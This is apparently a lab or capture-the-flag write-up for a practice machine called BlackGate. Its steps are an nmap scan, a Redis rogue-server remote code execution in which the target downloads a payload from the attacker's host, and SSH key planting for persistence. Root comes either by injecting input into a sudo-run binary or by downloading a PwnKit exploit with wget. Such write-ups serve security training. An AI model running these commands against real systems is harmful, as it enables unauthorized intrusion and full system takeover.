---
icon: ubuntu
---

# BlackGate - Hard

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.176 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 16:27 EDT
Nmap scan report for 192.168.118.176
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   30.15 ms 192.168.45.1
2   30.32 ms 192.168.45.254
3   30.48 ms 192.168.251.1
4   25.88 ms 192.168.118.176
```

### Redis <=5.0.5 RCE&#x20;

This is a very known vulnerability and there are a lot of exploit scripts available on [**Github**](https://github.com/n0b0dyCN/redis-rogue-server), I went ahead and used this [**one**](https://github.com/n0b0dyCN/redis-rogue-server)

Before running the exploit make sure to run it from the location where exp.so is located, otherwise it will not work. Since the exploit will be setting up a http server for exp.so to be downloaded by the target machine.

```
python3 redis-rogue-server.py --rhost=192.168.118.176 --rport=6379 --lhost=192.168.45.158 --lport=8000
```

<figure><img src="../../.gitbook/assets/image (1939).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1940).png" alt=""><figcaption></figcaption></figure>

### Generating ssh key

I am going to generate an ssh key for prudence, to get a better shell and for ease of login in case my shell collapses. Make a .ssh directory and cd into it after run the following commands:

```
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
```

<figure><img src="../../.gitbook/assets/image (1941).png" alt=""><figcaption></figcaption></figure>

```
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cat id_rsa
```

<figure><img src="../../.gitbook/assets/image (1942).png" alt=""><figcaption></figcaption></figure>

copy the key to your machine and use it to ssh&#x20;

<figure><img src="../../.gitbook/assets/image (1943).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1944).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (1945).png" alt=""><figcaption></figcaption></figure>

Running strings on the file we actually come across a password

<figure><img src="../../.gitbook/assets/image (1946).png" alt=""><figcaption></figcaption></figure>

I am gonna try to run the executable as sudo and play around with it

<figure><img src="../../.gitbook/assets/image (1950).png" alt=""><figcaption></figcaption></figure>

Not only did the Authorization key worked but the application is not sanitizing input and thanks to the fact that it is being run as the root user, I was able to manipulate it to give me a root shell.

## Privesc Second way

If you want to get it done in a different way you can do it with a kernel vulnerability as well, if you run Linpeas you will see that the app is vulnerable to PwnKit

<figure><img src="../../.gitbook/assets/image (1951).png" alt=""><figcaption></figcaption></figure>

```
git clone https://github.com/ly4k/PwnKit
```

```
wget 192.168.45.158/PwnKit
```

<figure><img src="../../.gitbook/assets/image (1952).png" alt=""><figcaption></figcaption></figure>
